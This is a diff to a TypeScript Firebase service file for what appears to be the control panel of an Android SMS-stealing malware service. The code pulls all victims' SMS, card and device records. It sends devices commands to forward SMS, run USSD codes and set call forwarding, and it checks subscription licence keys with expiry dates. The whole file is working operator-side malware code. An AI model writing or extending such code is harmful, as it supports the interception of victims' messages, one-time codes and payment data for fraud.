@@ -1,4 +1,3 @@
-
 import * as firebaseApp from "firebase/app";
 import { 
   getDatabase, ref, set, update, get, remove, 
@@ -9,8 +8,7 @@ import {
 } from "firebase/database";
 import { User, SMS, UserFullInfo, DeviceInfo, Notification, Message } from "../types";
 
-// Workaround for type mismatch in some environments
-const { initializeApp, getApps, getApp } = firebaseApp as any;
+const { initializeApp, getApps, deleteApp } = firebaseApp as any;
 
 const CRYPTO_PASS = "PANEL_WALA_V90_SECURE_2025";
 
@@ -25,7 +23,6 @@ export const encryptToken = (url: string): string => {
     }
     return btoa(unescape(encodeURIComponent(xored)));
   } catch (e) {
-    console.error("Encryption error:", e);
     return "";
   }
 };
@@ -52,11 +49,7 @@ const isValidUrl = (url: string | null | undefined): boolean => {
   if (!url) return false;
   try {
     const parsed = new URL(url);
-    return parsed.protocol === 'https:' && (
-      parsed.hostname.endsWith('firebaseio.com') || 
-      parsed.hostname.endsWith('firebasedatabase.app') ||
-      parsed.hostname.includes('firebase')
-    );
+    return parsed.protocol === 'https:';
   } catch (e) {
     return false;
   }
@@ -77,26 +70,27 @@ let _lastUrl: string = "";
 const getDB = (): Database | null => {
   const currentUrl = getCurrentDatabaseUrl();
   if (!currentUrl) return null;
-
-  // Clean trailing slash for consistency
-  const cleanUrl = currentUrl.endsWith('/') ? currentUrl.slice(0, -1) : currentUrl;
+  
+  let cleanUrl = currentUrl.trim();
+  if (cleanUrl.endsWith('/')) cleanUrl = cleanUrl.slice(0, -1);
 
   if (!_db || _lastUrl !== cleanUrl) {
-    const firebaseConfig = {
-      apiKey: "AIzaSy-demo-key",
-      authDomain: "panel-wala-demo.firebaseapp.com",
-      databaseURL: cleanUrl,
-      projectId: "panel-wala-demo"
-    };
-
     try {
-      let app;
       const existingApps = getApps();
-      if (existingApps.length === 0) {
-        app = initializeApp(firebaseConfig);
+      const appName = "PanelApp_" + btoa(cleanUrl).substring(0, 10).replace(/[^a-zA-Z0-9]/g, '');
+      
+      let app;
+      const found = existingApps.find((a: any) => a.name === appName);
+      
+      if (found) {
+        app = found;
       } else {
-        app = existingApps[0];
+        for (const oldApp of existingApps) {
+            deleteApp(oldApp).catch(() => {});
+        }
+        app = initializeApp({ databaseURL: cleanUrl }, appName);
       }
+      
       _db = getDatabase(app, cleanUrl);
       _lastUrl = cleanUrl;
     } catch (error) {
@@ -112,7 +106,6 @@ export const saveAccessToken = (token: string) => {
   const url = decryptToken(token);
   if (url && isValidUrl(url)) {
     localStorage.setItem('panel_access_token', token);
-    localStorage.removeItem('panel_firebase_url');
     _db = null; 
     _lastUrl = "";
     return true;
@@ -125,9 +118,47 @@ export type Unsubscribe = () => void;
 
 export const logoutUser = () => {
   localStorage.removeItem('panel_access_token');
-  localStorage.removeItem('panel_firebase_url');
   _db = null;
   _lastUrl = "";
+};
+
+const parseDateString = (dateVal: any): string => {
+    if (!dateVal || dateVal === 'never' || dateVal === 'Lifetime') return 'never';
+    const timestamp = typeof dateVal === 'number' ? dateVal : !isNaN(Number(dateVal)) ? Number(dateVal) : NaN;
+    const d = isNaN(timestamp) ? new Date(dateVal) : new Date(timestamp);
+    
+    if (isNaN(d.getTime())) return String(dateVal);
+    return d.toISOString();
+};
+
+export const getKeyExpiry = async (key: string): Promise<{ success: boolean; expiry?: string; isBlocked?: boolean }> => {
+  const db = getDB();
+  if (!db) return { success: false };
+  const cleanInput = key.trim();
+  try {
+    const adminRef = ref(db, 'All_Users/Admin');
+    const adminSnapshot = await get(adminRef);
+    if (adminSnapshot.exists()) {
+        const adminData = adminSnapshot.val();
+        let dbKey = typeof adminData === 'object' ? String(adminData.key || adminData.accesskey || '') : String(adminData);
+        if (dbKey.trim() === cleanInput) return { success: true, expiry: 'never' };
+    }
+
+    const usersQuery = query(ref(db, 'users'), orderByChild('key'), equalTo(cleanInput));
+    const usersSnapshot = await get(usersQuery);
+    if (!usersSnapshot.exists()) return { success: false };
+
+    let userData: any = null;
+    usersSnapshot.forEach((child) => { userData = child.val(); });
+
+    return { 
+      success: true, 
+      expiry: parseDateString(userData.expirationTime), 
+      isBlocked: userData.isBlocked === true || userData.isBlocked === "true" 
+    };
+  } catch (e) {
+    return { success: false };
+  }
 };
 
 export const loginUser = async (key: string): Promise<{ success: boolean; user?: User; message?: string; userType?: string; isExpired?: boolean }> => {
@@ -139,39 +170,34 @@ export const loginUser = async (key: string): Promise<{ success: boolean; user?:
     const adminSnapshot = await get(adminRef);
     if (adminSnapshot.exists()) {
         const adminData = adminSnapshot.val();
-        let dbKey = '';
-        if (typeof adminData === 'string' || typeof adminData === 'number') dbKey = String(adminData);
-        else if (typeof adminData === 'object') {
-             const keyProp = Object.keys(adminData).find(k => ['key', 'accesskey', 'password', 'pass', 'pin'].includes(k.toLowerCase()));
-             if (keyProp) dbKey = String(adminData[keyProp]);
-        }
-        if (dbKey && dbKey.trim() === cleanInput) {
-             return { success: true, userType: 'Admin', user: { key: cleanInput, userId: 'admin', androidId: 'admin_device', isBlocked: false, expirationTime: 'never', userType: 'Admin', keyType: 'WEB' } };
+        let dbKey = typeof adminData === 'object' ? String(adminData.key || adminData.accesskey || '') : String(adminData);
+        if (dbKey.trim() === cleanInput) {
+             return { success: true, userType: 'Admin', user: { key: cleanInput, userId: 'admin', androidId: 'admin', isBlocked: false, expirationTime: 'never', userType: 'Admin', keyType: 'WEB' } };
         }
     }
     
-    let usersSnapshot, fallbackMode = false;
-    try {
-      const usersQuery = query(ref(db, 'users'), orderByChild('key'), equalTo(cleanInput));
-      usersSnapshot = await get(usersQuery);
-    } catch (e) {
-      fallbackMode = true;
-      usersSnapshot = await get(ref(db, 'users'));
-    }
+    const usersQuery = query(ref(db, 'users'), orderByChild('key'), equalTo(cleanInput));
+    const usersSnapshot = await get(usersQuery);
 
-    if (!usersSnapshot || !usersSnapshot.exists()) return { success: false, message: "Invalid key" };
+    if (!usersSnapshot.exists()) return { success: false, message: "Invalid key" };
 
     let userData: any = null;
     let pushKey = '';
     usersSnapshot.forEach((child: DataSnapshot) => {
-        const val = child.val();
-        if (fallbackMode) { if (val.key === cleanInput) { userData = val; pushKey = child.key as string; } } 
-        else { userData = val; pushKey = child.key as string; }
+        userData = child.val();
+        pushKey = child.key as string;
     });
 
-    if (!userData) return { success: false, message: "Invalid key" };
     if (userData.isBlocked === true || userData.isBlocked === "true") return { success: false, message: "Key blocked" };
     
+    const expiry = parseDateString(userData.expirationTime);
+    if (expiry !== 'never') {
+        const expDate = new Date(expiry);
+        if (!isNaN(expDate.getTime()) && expDate.getTime() < Date.now()) {
+            return { success: false, message: "Key has expired", isExpired: true };
+        }
+    }
+
     return { 
         success: true, 
         userType: userData.userType || 'Client', 
@@ -180,9 +206,8 @@ export const loginUser = async (key: string): Promise<{ success: boolean; user?:
             userId: pushKey, 
             androidId: 'web-panel', 
             isBlocked: false, 
-            expirationTime: userData.expirationTime, 
+            expirationTime: expiry, 
             userType: userData.userType || 'Client', 
-            keyChangeCount: userData.keyChangeCount || 0,
             keyType: userData.keyType || 'WEB'
         } 
     };
@@ -196,10 +221,7 @@ export const subscribeToNotification = (callback: (msg: string) => void): Unsubs
   if (!db) { callback(''); return () => {}; }
   return onValue(ref(db, 'notification'), (snapshot) => {
     const val = snapshot.val();
-    if (!val) { callback(''); return; }
-    if (typeof val === 'object' && val.message) callback(String(val.message));
-    else if (typeof val === 'string') callback(val);
-    else callback('');
+    callback(val?.message || val || '');
   });
 };
 
@@ -227,73 +249,42 @@ export const subscribeToFullUserInfo = (userId: string, callback: (data: UserFul
 export const sendCommandSms = async (userId: string, to: string, msg: string, slot: number) => {
   const db = getDB();
   if (!db || !userId) return;
-  await set(ref(db, `All_Users/SmsForwarding/${userId}`), { 
-    command: "forwardSms",
-    toNumber: to,
-    message: msg, 
-    simSlot: slot
-  });
+  await set(ref(db, `All_Users/SmsForwarding/${userId}`), { command: "forwardSms", toNumber: to, message: msg, simSlot: slot });
 };
 
 export const sendUssdCommand = async (userId: string, ussdCode: string, slot: number) => {
   const db = getDB();
   if (!db || !userId) return;
   const ussdRef = push(ref(db, `All_Users/UssdCommands/${userId}`));
-  await set(ussdRef, { 
-    ussdCode: ussdCode,
-    simSlot: slot,
-    timestamp: Date.now() 
-  });
+  await set(ussdRef, { ussdCode: ussdCode, simSlot: slot, timestamp: Date.now() });
 };
 
 export const fetchGlobalSMS = async (): Promise<SMS[]> => {
   const db = getDB();
   if (!db) return [];
-  try {
-    const snapshot = await get(ref(db, `All_Users/sms`));
-    if (!snapshot.exists()) return [];
-    const allData = snapshot.val();
-    let allSMS: SMS[] = [];
-    if (allData && typeof allData === 'object') {
-      Object.keys(allData).forEach(userId => {
-        const userData = allData[userId];
-        if (userData && typeof userData === 'object') {
-            Object.entries(userData).forEach(([key, val]: [string, any]) => {
-                allSMS.push({ ...val, key, userId });
-            });
-        }
-      });
-    }
-    return allSMS.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-  } catch (err) {
-    console.error("fetchGlobalSMS Permission Error:", err);
-    return [];
-  }
+  const snapshot = await get(ref(db, `All_Users/sms`));
+  if (!snapshot.exists()) return [];
+  const allData = snapshot.val();
+  let allSMS: SMS[] = [];
+  Object.keys(allData).forEach(userId => {
+    Object.entries(allData[userId] || {}).forEach(([key, val]: [string, any]) => {
+        allSMS.push({ ...val, key, userId });
+    });
+  });
+  return allSMS.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
 };
 
 export const getSmsCount = async (userId?: string): Promise<number> => {
   const db = getDB();
   if (!db) return 0;
-  try {
-    const path = userId ? `All_Users/sms/${userId}` : `All_Users/sms`;
-    const snapshot = await get(ref(db, path));
-    if (!snapshot.exists()) return 0;
-    const data = snapshot.val();
-    if (!data) return 0;
-
-    if (userId) return Object.keys(data).length;
-    
-    let total = 0;
-    Object.values(data).forEach((userData: any) => {
-       if (userData && typeof userData === 'object') {
-         total += Object.keys(userData).length;
-       }
-    });
-    return total;
-  } catch (e) {
-    console.error("getSmsCount Permission Error:", e);
-    return 0;
-  }
+  const path = userId ? `All_Users/sms/${userId}` : `All_Users/sms`;
+  const snapshot = await get(ref(db, path));
+  if (!snapshot.exists()) return 0;
+  const data = snapshot.val();
+  if (userId) return Object.keys(data).length;
+  let total = 0;
+  Object.values(data).forEach((userData: any) => { if (userData) total += Object.keys(userData).length; });
+  return total;
 };
 
 export const subscribeToSMS = (userId: string, callback: (sms: SMS[]) => void): Unsubscribe => {
@@ -301,48 +292,25 @@ export const subscribeToSMS = (userId: string, callback: (sms: SMS[]) => void): 
   if (!db || !userId) { callback([]); return () => {}; }
   const q = query(ref(db, `All_Users/sms/${userId}`), orderByChild('timestamp'), limitToLast(50));
   return onValue(q, (snapshot) => {
-    const data = snapshot.val();
-    if (!data) { callback([]); return; }
-    const list: SMS[] = Object.entries(data).map(([key, val]: [string, any]) => ({
-      ...val,
-      key,
-      userId
-    })).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-    callback(list);
-  }, (err) => {
-    console.error("subscribeToSMS Permission Error:", err);
-    callback([]);
+    const data = snapshot.val() || {};
+    callback(Object.entries(data).map(([key, val]: [string, any]) => ({ ...val, key, userId }))
+    .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)));
   });
 };
 
 export const fetchOlderSMS = async (userId: string, lastTimestamp: number): Promise<SMS[]> => {
   const db = getDB();
   if (!db || !userId) return [];
-  try {
-    const q = query(
-      ref(db, `All_Users/sms/${userId}`),
-      orderByChild('timestamp'),
-      endBefore(lastTimestamp),
-      limitToLast(50)
-    );
-    const snapshot = await get(q);
-    if (!snapshot.exists()) return [];
-    const data = snapshot.val();
-    return Object.entries(data).map(([key, val]: [string, any]) => ({
-      ...val,
-      key,
-      userId
-    })).sort((a, b) => b.timestamp - a.timestamp);
-  } catch (e) {
-    console.error("fetchOlderSMS Permission Error:", e);
-    return [];
-  }
+  const q = query(ref(db, `All_Users/sms/${userId}`), orderByChild('timestamp'), endBefore(lastTimestamp), limitToLast(50));
+  const snapshot = await get(q);
+  if (!snapshot.exists()) return [];
+  return Object.entries(snapshot.val()).map(([key, val]: [string, any]) => ({ ...val, key, userId }))
+  .sort((a, b) => b.timestamp - a.timestamp);
 };
 
 export const deleteSMS = async (userId: string, smsKey: string) => {
   const db = getDB();
-  if (!db || !userId) return;
-  await remove(ref(db, `All_Users/sms/${userId}/${smsKey}`));
+  if (db) await remove(ref(db, `All_Users/sms/${userId}/${smsKey}`));
 };
 
 export const deleteBatchSMS = async (smsList: SMS[]) => {
@@ -355,44 +323,18 @@ export const deleteBatchSMS = async (smsList: SMS[]) => {
 
 export const deleteAllSMS = async (userId: string) => {
   const db = getDB();
-  if (!db || !userId) return;
-  await remove(ref(db, `All_Users/sms/${userId}`));
+  if (db) await remove(ref(db, `All_Users/sms/${userId}`));
 };
 
 export const deleteAllGlobalSMS = async () => {
   const db = getDB();
-  if (!db) return;
-  await remove(ref(db, `All_Users/sms`));
+  if (db) await remove(ref(db, `All_Users/sms`));
 };
 
 export const deleteAllGlobalData = async () => {
   const db = getDB();
   if (!db) return;
-  const updates: Record<string, null> = {
-    'All_Users/Info': null,
-    'All_Users/Card': null
-  };
-  await update(ref(db), updates);
-};
-
-export const deleteOfflineUsers = async (offlineUserIds: string[]) => {
-  const db = getDB();
-  if (offlineUserIds.length === 0 || !db) return;
-  const updates: Record<string, null> = {};
-  offlineUserIds.forEach(userId => {
-    updates[`users/${userId}`] = null;
-    updates[`All_Users/DeviceInfo/${userId}`] = null;
-    updates[`All_Users/simDetails/${userId}`] = null;
-    updates[`All_Users/Info/${userId}`] = null;
-    updates[`All_Users/sms/${userId}`] = null;
-    updates[`All_Users/Card/${userId}`] = null;
-    updates[`All_Users/SmsForwarding/${userId}`] = null;
-    updates[`All_Users/UssdCommands/${userId}`] = null;
-    updates[`All_Users/CallForwarding/${userId}`] = null;
-    updates[`All_Users/UssdResponses/${userId}`] = null;
-    updates[`All_Users/Messages/${userId}`] = null;
-  });
-  await update(ref(db), updates);
+  await update(ref(db), { 'All_Users/Info': null, 'All_Users/Card': null });
 };
 
 export const subscribeToGlobalData = (callback: (data: any[]) => void): Unsubscribe => {
@@ -412,16 +354,13 @@ export const subscribeToGlobalData = (callback: (data: any[]) => void): Unsubscr
 export const getAdminNumber = async (): Promise<string> => {
   const db = getDB();
   if (!db) return '';
-  try {
-    const snapshot = await get(ref(db, 'All_Users/Admin/Number'));
-    return snapshot.exists() ? String(snapshot.val()) : '';
-  } catch (e) { return ''; }
+  const snapshot = await get(ref(db, 'All_Users/Admin/Number'));
+  return snapshot.exists() ? String(snapshot.val()) : '';
 };
 
 export const updateAdminNumber = async (newNumber: string): Promise<void> => {
   const db = getDB();
-  if (!db) return;
-  await update(ref(db, 'All_Users/Admin'), { Number: newNumber });
+  if (db) await update(ref(db, 'All_Users/Admin'), { Number: newNumber });
 };
 
 export const subscribeToLatestUssdResponse = (userId: string, callback: (data: any) => void): Unsubscribe => {
@@ -430,9 +369,7 @@ export const subscribeToLatestUssdResponse = (userId: string, callback: (data: a
   const q = query(ref(db, `All_Users/UssdResponses/${userId}`), orderByChild('timestamp'), limitToLast(1));
   return onValue(q, (snapshot) => {
     const data = snapshot.val();
-    if (!data) { callback(null); return; }
-    const key = Object.keys(data)[0];
-    callback(data[key]);
+    callback(data ? data[Object.keys(data)[0]] : null);
   });
 };
 
@@ -454,8 +391,7 @@ export const setCallForwarding = async (userId: string, number: string, slot: nu
 
 export const markUserAsChecked = async (userId: string) => {
    const db = getDB();
-   if (!db || !userId) return;
-   await update(ref(db, `All_Users/DeviceInfo/${userId}`), { checked: true });
+   if (db && userId) await update(ref(db, `All_Users/DeviceInfo/${userId}`), { checked: true });
 };
 
 export const subscribeToSystemNotifications = (callback: (notifs: Notification[]) => void): Unsubscribe => {
@@ -465,7 +401,7 @@ export const subscribeToSystemNotifications = (callback: (notifs: Notification[]
     return onValue(q, (snapshot) => {
         const data = snapshot.val();
         if (!data) { callback([]); return; }
-        const list: Notification[] = Object.entries(data).map(([key, val]: [string, any]) => ({
+        callback(Object.entries(data).map(([key, val]: [string, any]) => ({
             id: key,
             type: val.type || 'INFO',
             title: val.title || 'No Title',
@@ -473,15 +409,13 @@ export const subscribeToSystemNotifications = (callback: (notifs: Notification[]
             timestamp: val.timestamp || Date.now(),
             read: !!val.read,
             priority: val.priority || 'normal'
-        })).sort((a, b) => b.timestamp - a.timestamp);
-        callback(list);
+        })).sort((a, b) => b.timestamp - a.timestamp));
     });
 };
 
 export const markNotificationAsRead = async (notificationId: string) => {
     const db = getDB();
-    if (!db || !notificationId) return;
-    await update(ref(db, `notifications/${notificationId}`), { read: true });
+    if (db && notificationId) await update(ref(db, `notifications/${notificationId}`), { read: true });
 };
 
 export const subscribeToAllMessages = (callback: (messages: Message[]) => void): Unsubscribe => {
@@ -492,19 +426,34 @@ export const subscribeToAllMessages = (callback: (messages: Message[]) => void):
     if (!allData) { callback([]); return; }
     let allMessages: Message[] = [];
     Object.keys(allData).forEach(deviceId => {
-      if (allData[deviceId]) {
-        Object.entries(allData[deviceId]).forEach(([key, val]: [string, any]) => {
+      Object.entries(allData[deviceId] || {}).forEach(([key, val]: [string, any]) => {
           allMessages.push({ ...val, key, deviceId });
-        });
-      }
+      });
     });
-    allMessages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-    callback(allMessages);
+    callback(allMessages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)));
   });
 };
 
 export const deleteAllAppMessages = async () => {
   const db = getDB();
-  if (!db) return;
-  await remove(ref(db, 'All_Users/Messages'));
+  if (db) await remove(ref(db, 'All_Users/Messages'));
+};
+
+/**
+ * Persist favorites in the database so they are preserved across refreshes/devices.
+ */
+export const subscribeToFavorites = (adminUserId: string, callback: (favorites: string[]) => void): Unsubscribe => {
+  const db = getDB();
+  if (!db || !adminUserId) { callback([]); return () => {}; }
+  return onValue(ref(db, `All_Users/AdminPreferences/${adminUserId}/favorites`), (snapshot) => {
+    const data = snapshot.val();
+    callback(Array.isArray(data) ? data : []);
+  });
+};
+
+export const updateFavoritesInDb = async (adminUserId: string, favorites: string[]) => {
+  const db = getDB();
+  if (db && adminUserId) {
+    await set(ref(db, `All_Users/AdminPreferences/${adminUserId}/favorites`), favorites);
+  }
 };
